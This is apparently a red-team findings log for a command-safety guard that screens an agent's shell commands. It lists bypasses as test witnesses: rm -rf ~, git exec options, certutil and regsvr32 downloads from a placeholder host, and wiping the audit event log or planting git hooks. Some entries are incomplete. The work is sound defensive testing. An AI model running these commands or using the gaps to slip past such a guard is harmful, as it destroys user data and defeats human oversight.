findings.title: --check verdict lets & newline backtick $( ^ through although README says it is retyped into a shell
findings.claim: ∃ argv: assessCommandSafety(argv,{runsWithoutShell:false}).ok ∧ a shell would run a second command (only ; | < > && || are tested)
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-1) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; assessCommandSafety(['git','log','--format=x & calc'],{cwd,projectRoot,runsWithoutShell:false}); also newline, backtick, $(..), ^&
findings.observed: All 5 allowed (ok:true). SHELL_OPERATORS = [&&,||,;,|,<,>]; single &, newline, backtick, $(, ^ are not in it.
findings.fix: In check-only mode reject any token containing & newline backtick $ ^ % ! ( ) or a leading ~; or never emit an allowed verdict meant for retyping.

findings.title: --check allows rm -rf ~ / $HOME / %USERPROFILE%: a retyped shell expands them to the home dir
findings.claim: ∃ target ∈ {~,$HOME,%USERPROFILE%,~/x}: guard(rm -rf target, runsWithoutShell:false).ok ∧ shell resolves target outside the project
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-2) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; assessCommandSafety(['rm','-rf','~'],{cwd:root,projectRoot:root,runsWithoutShell:false}).ok === true
findings.observed: rm -rf ~, $HOME, %USERPROFILE%, ~/work all ok:true with note 'limited to explicit paths inside the project root' (resolved as a literal ./~).
findings.fix: In targetProblem reject leading ~, $, %..% , backtick and $( in delete/move targets when runsWithoutShell is false.

findings.title: git exec forms allowed: submodule foreach, bisect run, rebase -x, --upload-pack, ext::, grep -O, --ext-diff
findings.claim: ∃ git argv ∈ exec-forms: guard.ok (README: blocks aliases/helpers that run programs; only git -c and unknown subcommands are checked)
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-3) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; ['git','rebase','-x','calc','HEAD~1'], ['git','bisect','run','calc'], ['git','submodule','foreach','calc'], ['git','fetch','--upload-pack=calc','origin'], ['git','clone','ext::calc','x'], ['git','grep','-O','calc','x'], ['git','diff','--ext-diff']
findings.observed: All 9 allowed. Own corpus class git-exec recall 13.3% (2/15 blocked).
findings.fix: Per-subcommand allowlist of option shapes; deny --exec/-x, --upload-pack/--receive-pack, ext:: transports, bisect run, submodule foreach/update, grep -O, --ext-diff/--textconv.

findings.title: git destructive forms allowed: gc --prune=now, reflog expire, rm -rf ., checkout <rev> <path>, branch -f/-M
findings.claim: ∃ git argv destructive: guard.ok while README claims destructive git forms are blocked
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-4) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; ['git','gc','--prune=now'], ['git','reflog','expire','--expire=now','--all'], ['git','rm','-rf','.'], ['git','checkout','HEAD','src'], ['git','branch','-f','main','HEAD~5'], ['git','branch','-M','x'], ['git','worktree','remove','-f','x']
findings.observed: All allowed. Own corpus class git-destroy recall 15.8% (3/19).
findings.fix: Allowlist read-only git subcommands plus vetted writers (add/commit/switch/merge --ff-only); block rm, gc, prune, reflog expire, update-ref -d, filter-branch, branch -f/-M, tag -d/-f, worktree remove/prune, checkout with any pathspec.

findings.title: git can retarget or write outside the project: -C/--work-tree/--git-dir ignored, --output= and -o write anywhere
findings.claim: ∃ git argv: guard.ok ∧ effect writes/deletes outside projectRoot
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-5) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; ['git','-C','../../outside','rm','-rf','.'], ['git','--work-tree=/','rm','-rf','.'], ['git','log','--output=../../outside/x'], ['git','format-patch','-o','../../outside','HEAD~1'], ['git','archive','-o','../../outside/x.tar','HEAD']
findings.observed: All 5 allowed; no path from a git option goes through checkTargets.
findings.fix: Resolve and containment-check -C, --git-dir, --work-tree, --output, -o like delete targets.

findings.title: truncate/cp/dd/sed -i/tee/rsync can wipe .cws/events.jsonl or plant .git hooks; protection is rm/mv only
findings.claim: ∃ argv ∈ {truncate,cp,dd,sed -i,tee,ln,rsync}: guard.ok ∧ target ∈ .cws ∪ .git (protection exists only for the rm/mv family)
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-6) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; ['truncate','-s','0','.cws/events.jsonl'], ['cp','/dev/null','.cws/events.jsonl'], ['cp','evil.sh','.git/hooks/pre-commit'], ['dd','if=/dev/zero','of=.cws/events.jsonl'], ['sed','-i','s/a/b/','.cws/events.jsonl'], ['tee','.git/hooks/pre-commit'], ['rsync','-a','--delete','empty/','.cws/']
findings.observed: All 8 allowed with ok:true, destructive:false, note "no destructive filesystem pattern detected". Own corpus fs-write recall 8.3% (1/12), fs-delete 0/9. A planted .git/hooks/pre-commit is code execution on the next git commit.
findings.fix: Treat any argument resolving into .git/.cws as protected for every command, not only rm/mv; or invert to an allowlist.

findings.title: Writers can write outside the project root: cp, dd of=, curl -o, wget -O, tar --remove-files, unlink
findings.claim: ∃ argv: guard.ok ∧ writes/deletes a path outside projectRoot (containment only for the rm/mv/del family)
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-7) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; ['cp','src/a','../../outside/b'], ['dd','if=src/a','of=../../outside/b'], ['curl','-o','../../outside/b','http://x'], ['wget','-O','../../outside/b','http://x'], ['tar','--remove-files','-cf','../../outside/a.tar','src'], ['unlink','../../outside/x']
findings.observed: All allowed (shred and rm are caught).
findings.fix: As S-6; add unlink/trash to DELETE_COMMANDS and path-check cp/dd/curl/wget/tar outputs.

findings.title: Launcher denylist incomplete: tsx, ts-node, node22, java, dotnet, ssh, awk, fd -x, rg --pre run arbitrary code
findings.claim: ∃ launcher ∉ LAUNCHERS: guard.ok ∧ launcher executes attacker-chosen code (README: blocks shells, interpreters, wrappers)
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-8) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; ['tsx','x.ts'], ['ts-node','x.ts'], ['node22','-e','1'], ['java','-jar','x.jar'], ['dotnet','x.dll'], ['ssh','host','x'], ['awk','BEGIN{system("calc")}'], ['fd','-x','rm'], ['rg','--pre','calc','x']
findings.observed: All 9 allowed. Measured: own corpus exec-launcher recall 13.0% (3/23); GTFOBins (command/shell/file-write; 441 entries parsed) recall 19.3% (85/441): command 12.1%, shell 19.1%, file-write 22.9%; precision on 112 benign dev commands 100% (0 FP, noshell) so the miss is a pure denylist gap. Whole own claimed corpus: recall 34.0% (36/106), 100% only on rm/mv/find/push/clean-style delete-claimed class (26/26).
findings.fix: Allowlist model: known read-only/build tools by exact name, everything else needs a human; at least add node\d+, tsx, ts-node, java, dotnet, ssh, awk/gawk, fd -x, rg --pre.

findings.title: Windows LOLBAS pass the guard: certutil -urlcache, bitsadmin, regsvr32 scrobj, forfiles, wmic, msbuild
findings.claim: ∃ LOLBAS(Execute|Download) argv: guard.ok
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-9) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; ['certutil','-urlcache','-f','http://x/a','a.exe'], ['bitsadmin','/transfer','j','http://x/a','C:\\a.exe'], ['regsvr32','/s','/u','/i:http://x/a.sct','scrobj.dll'], ['forfiles','/c','cmd /c del @file'], ['wmic','process','call','create','calc'], ['msbuild','x.xml']

findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-11) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; ['npm','ls','exec'], ['npm','view','x','version'], ['pnpm','add','dlx'] must be ok

findings.title: runTool and safe-run pass the full parent environment (GEMINI_API_KEY etc.) to every child
findings.claim: ∀ child spawned by runTool/safe-run: child.env ⊇ parent secrets (opts.env ?? process.env)
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-12) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; process.env.GEMINI_API_KEY='canary'; runTool(process.execPath,['-e','process.stdout.write(process.env.GEMINI_API_KEY ?? "absent")'])
findings.observed: stdout was 'canary-gemini-key-123' (expected 'absent'). Applies to ocr, semgrep, openshell/wsl, doctor --deep and safe-run children (spawn without env option inherits). exec.ts header documents 'the environment is inherited'.
findings.fix: Pass an allowlisted env (PATH, HOME, TEMP, SystemRoot, LANG ...) by default; strip *_KEY/*_TOKEN/*_SECRET and GEMINI_*.

findings.title: safe-run spawn(argv[0]) of a bare name runs a project-planted binary (Windows cwd lookup)
findings.claim: ∃ planted ls.exe in cwd: safe-run -- ls runs it instead of PATH ls
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-13) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; copy cmd.exe to <cwd>\ls.exe; safe-run -- ls /c exit 77 must not exit 77
findings.observed: REFUTED on Node 24.15 / Windows 10: the real ls from PATH ran; no cwd lookup; test is green.
findings.fix: None needed on this Node; keep test as regression.

findings.title: killTree spawns bare taskkill; a planted ./taskkill.exe would run on timeout (Windows)

findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-14) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; copy hostname.exe to <cwd>\taskkill.exe; chdir; runTool(node sleep 4s,{timeoutMs:300}) must return in <2.5s

findings.claim: ∃ cwd with clip.exe: copy() runs it
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-15) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; copy hostname.exe to <cwd>\clip.exe; spawnSync("clip",[],{cwd}) must not print the hostname
findings.observed: REFUTED: System32 clip ran. Green.

findings.title: safe-run passes the child exit code through unmapped: child exit 2/3 looks like cws NEEDS_HUMAN/INTEGRITY
findings.claim: ∃ child exit c ∈ {2,3}: cws exits c, colliding with EXIT.NEEDS_HUMAN/INTEGRITY
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-16) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; safe-run -- git ls-remote --exit-code . refs/heads/none  (git exits 2)
findings.observed: cws exited 2 = NEEDS_HUMAN ("a human action was attempted non-interactively"); robocopy success codes 1-3 would surface as ERROR/NEEDS_HUMAN/INTEGRITY. Callers cannot tell a failing child from an authority or integrity event.
findings.fix: Map child failures to ERROR with the child code in the message, or reserve a distinct band.

findings.title: safe-run has no timeout and no way to set one; child runs with stdio inherited
findings.claim: ∀ safe-run child: no deadline, no kill
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-17) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; static: src/cli/commands/safety.ts contains no "timeout"
findings.observed: No timeout option or kill path, unlike runTool (30s default, tree kill). Witness is a static source check, so weaker than the others.
findings.fix: Add --timeout with a default and reuse killTree.

findings.title: runTool timeoutMs >= 2^31 (or Infinity) silently becomes 1 ms and kills the child
findings.claim: ∃ timeoutMs ≥ 2^31: runTool(...).timedOut
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-18) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; runTool(process.execPath,['-e','setTimeout(()=>{},300)'],{timeoutMs:2**31})
findings.observed: TimeoutOverflowWarning "Timeout duration was set to 1"; result.timedOut true, ok false.
findings.fix: Clamp timeoutMs to [1, 2^31-1] and require finite.

findings.title: findExecutable never finds a name that already has an extension on Windows (node.exe, semgrep.exe)
findings.claim: findExecutable("node.exe") === null on win32 although node.exe is on PATH
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-19) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; findExecutable('node.exe') on win32
findings.observed: null: candidates are only name+PATHEXT (node.exe.COM, node.exe.EXE ...); the bare name is never tried.
findings.fix: On win32 also try the bare name when it already ends in a PATHEXT extension.

findings.title: Sandbox upload is the whole project root (.:/sandbox): .git, .cws and any .env are copied into the sandbox
findings.claim: uploadSpec() = ".:/sandbox" so every file under projectRoot incl. .git, .cws and secret files is uploaded
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-20) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; uploadSpec() must not equal ".:/sandbox"
findings.observed: Returned '.:/sandbox'. No exclude list; the code being sandboxed receives repo secrets.
findings.fix: Upload a staged copy that omits .git, .cws, .env*, key files; or only src/ read-only.

findings.title: sandbox run evidence stores the raw command line, including tokens passed as arguments
findings.claim: runEvidencePayload(...).text contains the unmasked command
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-21) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; runEvidencePayload('c1',['curl','-H','Authorization: Bearer ghp_<36 chars>','https://x'],result,'p').text
findings.observed: Text includes the ghp_ token verbatim; it is appended to the hash-chained (immutable) event log and printed by report().
findings.fix: maskSecrets the command before it enters evidence or output.

findings.title: sandbox run exits with the sandboxed command code unmapped (remote 2/3 = NEEDS_HUMAN/INTEGRITY); timeout is exit 1
findings.claim: throw new CliExit(result.code ?? EXIT.ERROR) collides with reserved codes
findings.witness: node --test --import tsx tests/redteam/guard/witnesses.test.ts (test id S-22) in E:\Dev\cws-claude\tests\redteam\guard\witnesses.test.ts; static: source contains "throw new CliExit(result.code ?? EXIT.ERROR)"
findings.observed: Present; same collision as S-16, and a timed-out run is indistinguishable from an ordinary failure at the exit-code level.
findings.fix: Reserve bands as in S-16; use a dedicated timeout code.
